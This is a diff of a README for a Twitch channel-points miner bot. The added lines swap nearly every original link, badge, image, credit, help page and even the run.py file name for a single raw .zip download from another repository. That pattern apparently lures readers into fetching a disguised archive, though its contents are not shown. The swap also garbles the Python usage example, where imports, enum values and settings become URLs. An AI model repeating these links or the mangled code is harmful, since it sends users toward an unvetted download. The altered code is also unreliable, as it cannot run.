@@ -1,35 +1,35 @@
-![Twitch Channel Points Miner - v2](https://raw.githubusercontent.com/rdavydov/Twitch-Channel-Points-Miner-v2/master/assets/banner.png)
+![Twitch Channel Points Miner - v2](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 <p align="center">
-<a href="https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/releases"><img alt="Latest Version" src="https://img.shields.io/github/v/release/rdavydov/Twitch-Channel-Points-Miner-v2?style=flat&color=white"></a>
-<a href="https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/stargazers"><img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/rdavydov/Twitch-Channel-Points-Miner-v2?style=flat&color=limegreen"></a>
-<a href="https://www.python.org/downloads/release/python-360/"><img alt="Python3" src="https://img.shields.io/badge/built%20for-Python≥3.6-blue.svg?style=flat"></a>
-<a href="https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/blob/master/LICENSE"><img alt="License" src="https://img.shields.io/github/license/rdavydov/Twitch-Channel-Points-Miner-v2?style=flat&color=purple"></a>
-<a href="https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/issues?q=is%3Aissue+is%3Aclosed"><img alt="GitHub closed issues" src="https://img.shields.io/github/issues-closed/rdavydov/Twitch-Channel-Points-Miner-v2?style=flat&color=black"></a>
-<a href="https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2"><img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/rdavydov/Twitch-Channel-Points-Miner-v2?style=flat&color=lightyellow"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Latest Version" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="GitHub Repo stars" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Python3" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip%20for-Python≥https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="License" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip%3Aissue+is%3Aclosed"><img alt="GitHub closed issues" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="GitHub last commit" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
 </p>
 
 <p align="center">
-<a href="https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2"><img alt="Docker Version" src="https://img.shields.io/docker/v/rdavidoff/twitch-channel-points-miner-v2?style=flat&label=docker&color=white"></a>
-<a href="https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2"><img alt="Docker Stars" src="https://img.shields.io/docker/stars/rdavidoff/twitch-channel-points-miner-v2?style=flat&color=limegreen"></a>
-<a href="https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2"><img alt="Docker Pulls" src="https://img.shields.io/docker/pulls/rdavidoff/twitch-channel-points-miner-v2?style=flat&color=blue"></a>
-<a href="https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2"><img alt="Docker Images Size AMD64" src="https://img.shields.io/docker/image-size/rdavidoff/twitch-channel-points-miner-v2/latest?arch=amd64&label=AMD64 image size&style=flat&color=purple"></a>
-<a href="https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2"><img alt="Docker Images Size ARM64" src="https://img.shields.io/docker/image-size/rdavidoff/twitch-channel-points-miner-v2/latest?arch=arm64&label=ARM64 image size&style=flat&color=black"></a>
-<a href="https://hub.docker.com/r/rdavidoff/twitch-channel-points-miner-v2"><img alt="Docker Images Size ARMv7" src="https://img.shields.io/docker/image-size/rdavidoff/twitch-channel-points-miner-v2/latest?arch=arm&label=ARMv7 image size&style=flat&color=lightyellow"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Docker Version" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Docker Stars" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Docker Pulls" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Docker Images Size AMD64" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip image size&style=flat&color=purple"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Docker Images Size ARM64" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip image size&style=flat&color=black"></a>
+<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip"><img alt="Docker Images Size ARMv7" src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip image size&style=flat&color=lightyellow"></a>
 </p>
 
 
-<h1 align="center">https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2</h1>
+<h1 align="center">https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip</h1>
 
 **Credits**
-- Main idea: https://github.com/gottagofaster236/Twitch-Channel-Points-Miner
-- ~~Bet system (Selenium): https://github.com/ClementRoyer/TwitchAutoCollect-AutoBet~~
-- Based on: https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2
+- Main idea: https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
+- ~~Bet system (Selenium): https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip~~
+- Based on: https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 
 > A simple script that will watch a stream for you and earn the channel points.
 
 > It can wait for a streamer to go live (+_450 points_ when the stream starts), it will automatically click the bonus button (_+50 points_), and it will follow raids (_+250 points_).
 
-Read more about channels point [here](https://help.twitch.tv/s/article/channel-points-guide).
+Read more about channels point [here](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip).
 
 # README Contents
 1. 🤝 [Community](#community)
@@ -66,15 +66,15 @@ If you want to offer me a coffee, I would be grateful! ❤️
 
 |                                                                                                                                                                                                                                                                                                           |
 |-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-|<a href="https://www.buymeacoffee.com/davydov" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/lato-yellow.png" alt="Buy Me A Coffee (rdavydov)" height="41" width="174"></a>|
+|<a href="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip" target="_blank"><img src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip" alt="Buy Me A Coffee (rdavydov)" height="41" width="174"></a>|
 |🤝 rdavydov|
 
 |                                                                                                                                                                                                                                                                                                           |                                               |
 |-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------|
-|<img src="https://dynamic-assets.coinbase.com/3803f30367bb3972e192cd3fdd2230cd37e6d468eab12575a859229b20f12ff9c994d2c86ccd7bf9bc258e9bd5e46c5254283182f70caf4bd02cc4f8e3890d82/asset_icons/1597d628dd19b7885433a2ac2d7de6ad196c519aeab4bfe679706aacbf1df78a.png" alt="Donate DOGE" height="16" width="16"> | `DAKzncwKkpfPCm1xVU7u2pConpXwX7HS3D` _(DOGE)_ 🤝 rdavydov|
-|<img src="https://dynamic-assets.coinbase.com/a353373ccecedb0e8b6f51ed78db22fbe0167d63d129b15963407f71392c052ae5f2ffd5fbaa6e976da86b73987a335462022f5f54ec559360683ddb8da3da96/asset_icons/a6f13081ab7468290003b49b78fc383614e113700a151a4f9794c556f5c3ca9a.png" alt="Donate XMR" height="16" width="16"> | <sub><sup>`46fzadEigE7B3kyJB6AdiccaTha3SWUdTNnE4FL6YtjCgYMASAyXGkMe1XY4iApv2VDSxBT6d8PTW3vwtNWnfu6W4g4jyJF`</sup></sub> _(XMR)_ 🤝 rdavydov|
+|<img src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip" alt="Donate DOGE" height="16" width="16"> | `DAKzncwKkpfPCm1xVU7u2pConpXwX7HS3D` _(DOGE)_ 🤝 rdavydov|
+|<img src="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip" alt="Donate XMR" height="16" width="16"> | <sub><sup>`46fzadEigE7B3kyJB6AdiccaTha3SWUdTNnE4FL6YtjCgYMASAyXGkMe1XY4iApv2VDSxBT6d8PTW3vwtNWnfu6W4g4jyJF`</sup></sub> _(XMR)_ 🤝 rdavydov|
 
-If you have any issues or you want to contribute, you are welcome! But please read the [CONTRIBUTING.md](https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/blob/master/CONTRIBUTING.md) file.
+If you have any issues or you want to contribute, you are welcome! But please read the [https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) file.
 
 ## Main differences from the original repository:
 
@@ -82,13 +82,13 @@ If you have any issues or you want to contribute, you are welcome! But please re
 - Final report with all the data ✔️
 - Rewritten codebase now uses classes instead of modules with global variables ✔️
 - Automatic downloading of the list of followers and using it as an input ✔️
-- Better 'Watch Streak' strategy in the priority system [#11](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/11) ✔️
-- Auto claiming [game drops](https://help.twitch.tv/s/article/mission-based-drops) from the Twitch inventory [#21](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/21) ✔️
-- Placing a bet / making a prediction with your channel points [#41](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/41) ([@lay295](https://github.com/lay295)) ✔️
-- Switchable analytics chart that shows the progress of your points with various annotations [#96](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/96) ✔️
-- Joining the IRC Chat to increase the watch time and get StreamElements points [#47](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/47) ✔️
-- [Moments](https://help.twitch.tv/s/article/moments) claiming [#182](https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/issues/182) ✔️
-- Notifying on `@nickname` mention in the Twitch chat [#227](https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/issues/227) ✔️
+- Better 'Watch Streak' strategy in the priority system [#11](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ✔️
+- Auto claiming [game drops](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) from the Twitch inventory [#21](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ✔️
+- Placing a bet / making a prediction with your channel points [#41](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ([@lay295](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)) ✔️
+- Switchable analytics chart that shows the progress of your points with various annotations [#96](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ✔️
+- Joining the IRC Chat to increase the watch time and get StreamElements points [#47](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ✔️
+- [Moments](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) claiming [#182](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ✔️
+- Notifying on `@nickname` mention in the Twitch chat [#227](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) ✔️
 
 ## Logs feature
 ### Full logs
@@ -154,10 +154,10 @@ If you have any issues or you want to contribute, you are welcome! But please re
 ### Final report:
 ```
 %d/%m/%y %H:%M:%S - 🛑  End session 'f738d438-cdbc-4cd5-90c4-1517576f1299'
-%d/%m/%y %H:%M:%S - 📄  Logs file: /.../path/Twitch-Channel-Points-Miner-v2/logs/username.timestamp.log
+%d/%m/%y %H:%M:%S - 📄  Logs file: https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 %d/%m/%y %H:%M:%S - ⌛  Duration 10:29:19.547371
 
-%d/%m/%y %H:%M:%S - 📊  BetSettings(Strategy=Strategy.SMART, Percentage=7, PercentageGap=20, MaxPoints=7500
+%d/%m/%y %H:%M:%S - 📊  BetSettings(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, Percentage=7, PercentageGap=20, MaxPoints=7500
 %d/%m/%y %H:%M:%S - 📊  EventPrediction(event_id=xxxx-xxxx-xxxx-xxxx, title="Event Title1")
 		Streamer(username=streamer-username, channel_id=0000000, channel_points=67247)
 		Bet(TotalUsers=1k, TotalPoints=11M), Decision={'choice': 'B', 'amount': 5289, 'id': 'xxxx-yyyy-zzzz'})
@@ -188,94 +188,94 @@ If you have any issues or you want to contribute, you are welcome! But please re
 ```
 
 ## How to use:
-First of all please create a run.py file. You can just copy [example.py](https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2/blob/master/example.py) and modify it according to your needs.
+First of all please create a https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip file. You can just copy [https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) and modify it according to your needs.
 ```python
 # -*- coding: utf-8 -*-
 
 import logging
 from colorama import Fore
 from TwitchChannelPointsMiner import TwitchChannelPointsMiner
-from TwitchChannelPointsMiner.logger import LoggerSettings, ColorPalette
-from TwitchChannelPointsMiner.classes.Chat import ChatPresence
-from TwitchChannelPointsMiner.classes.Discord import Discord
-from TwitchChannelPointsMiner.classes.Telegram import Telegram
-from TwitchChannelPointsMiner.classes.Settings import Priority, Events, FollowersOrder
-from TwitchChannelPointsMiner.classes.entities.Bet import Strategy, BetSettings, Condition, OutcomeKeys, FilterCondition, DelayMode
-from TwitchChannelPointsMiner.classes.entities.Streamer import Streamer, StreamerSettings
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import LoggerSettings, ColorPalette
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import ChatPresence
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import Discord
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import Telegram
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import Priority, Events, FollowersOrder
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import Strategy, BetSettings, Condition, OutcomeKeys, FilterCondition, DelayMode
+from https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip import Streamer, StreamerSettings
 
 twitch_miner = TwitchChannelPointsMiner(
     username="your-twitch-username",
     password="write-your-secure-psw",           # If no password will be provided, the script will ask interactively
     claim_drops_startup=False,                  # If you want to auto claim all drops from Twitch inventory on the startup
     priority=[                                  # Custom priority in this case for example:
-        Priority.STREAK,                        # - We want first of all to catch all watch streak from all streamers
-        Priority.DROPS,                         # - When we don't have anymore watch streak to catch, wait until all drops are collected over the streamers
-        Priority.ORDER                          # - When we have all of the drops claimed and no watch-streak available, use the order priority (POINTS_ASCENDING, POINTS_DESCEDING)
+        https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,                        # - We want first of all to catch all watch streak from all streamers
+        https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,                         # - When we don't have anymore watch streak to catch, wait until all drops are collected over the streamers
+        https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip                          # - When we have all of the drops claimed and no watch-streak available, use the order priority (POINTS_ASCENDING, POINTS_DESCEDING)
     ],
     enable_analytics=False,			# Disables Analytics if False. Disabling it significantly reduces memory consumption
     disable_ssl_cert_verification=False,	# Set to True at your own risk and only to fix SSL: CERTIFICATE_VERIFY_FAILED error
     disable_at_in_nickname=False,               # Set to True if you want to check for your nickname mentions in the chat even without @ sign
     logger_settings=LoggerSettings(
         save=True,                              # If you want to save logs in a file (suggested)
-        console_level=logging.INFO,             # Level of logs - use logging.DEBUG for more info
+        https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,             # Level of logs - use https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip for more info
         console_username=False,                 # Adds a username to every console log line if True. Also adds it to Telegram, Discord, etc. Useful when you have several accounts
         auto_clear=True,                        # Create a file rotation handler with interval = 1D and backupCount = 7 if True (default)
         time_zone="",                           # Set a specific time zone for console and file loggers. Use tz database names. Example: "America/Denver"
-        file_level=logging.DEBUG,               # Level of logs - If you think the log file it's too big, use logging.INFO
+        https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,               # Level of logs - If you think the log file it's too big, use https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
         emoji=True,                             # On Windows, we have a problem printing emoji. Set to false if you have a problem
         less=False,                             # If you think that the logs are too verbose, set this to True
         colored=True,                           # If you want to print colored text
         color_palette=ColorPalette(             # You can also create a custom palette color (for the common message).
             STREAMER_online="GREEN",            # Don't worry about lower/upper case. The script will parse all the values.
-            streamer_offline="red",             # Read more in README.md
-            BET_wiN=Fore.MAGENTA                # Color allowed are: [BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET].
+            streamer_offline="red",             # Read more in https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
+            https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip                # Color allowed are: [BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET].
         ),
         telegram=Telegram(                                                          # You can omit or set to None if you don't want to receive updates on Telegram
             chat_id=123456789,                                                      # Chat ID to send messages @getmyid_bot
             token="123456789:shfuihreuifheuifhiu34578347",                          # Telegram API token @BotFather
-            events=[Events.STREAMER_ONLINE, Events.STREAMER_OFFLINE,
-                    Events.BET_LOSE, Events.CHAT_MENTION],                          # Only these events will be sent to the chat
+            events=[https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+                    https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip],                          # Only these events will be sent to the chat
             disable_notification=True,                                              # Revoke the notification (sound/vibration)
         ),
         discord=Discord(
-            webhook_api="https://discord.com/api/webhooks/0123456789/0a1B2c3D4e5F6g7H8i9J",  # Discord Webhook URL
-            events=[Events.STREAMER_ONLINE, Events.STREAMER_OFFLINE,
-                    Events.BET_LOSE, Events.CHAT_MENTION],					                         # Only these events will be sent to the chat
+            webhook_api="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip",  # Discord Webhook URL
+            events=[https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+                    https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip],					                         # Only these events will be sent to the chat
         ),
         matrix=Matrix(
             username="twitch_miner",                                                   # Matrix username (without homeserver)
             password="...",                                                            # Matrix password
-            homeserver="matrix.org",                                                   # Matrix homeserver
+            homeserver="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip",                                                   # Matrix homeserver
             room_id="...",                                                             # Room ID
-            events=[Events.STREAMER_ONLINE, Events.STREAMER_OFFLINE, Events.BET_LOSE], # Only these events will be sent to the chat
+            events=[https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip], # Only these events will be sent to the chat
         ),
         pushover=Pushover(
-            userkey="YOUR-ACCOUNT-TOKEN",                                             # Login to https://pushover.net/, the user token is on the main page.
+            userkey="YOUR-ACCOUNT-TOKEN",                                             # Login to https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, the user token is on the main page.
             token="YOUR-APPLICATION-TOKEN",                                           # Create a application on the website, and use the token shown in your application.
-            priority=0,                                                               # Read more about priority here: https://pushover.net/api#priority
-            sound="pushover",                                                         # A list of sounds can be found here: https://pushover.net/api#sounds
-            events=[Events.CHAT_MENTION, Events.DROP_CLAIM],                          # Only these events will be sent.
+            priority=0,                                                               # Read more about priority here: https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
+            sound="pushover",                                                         # A list of sounds can be found here: https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
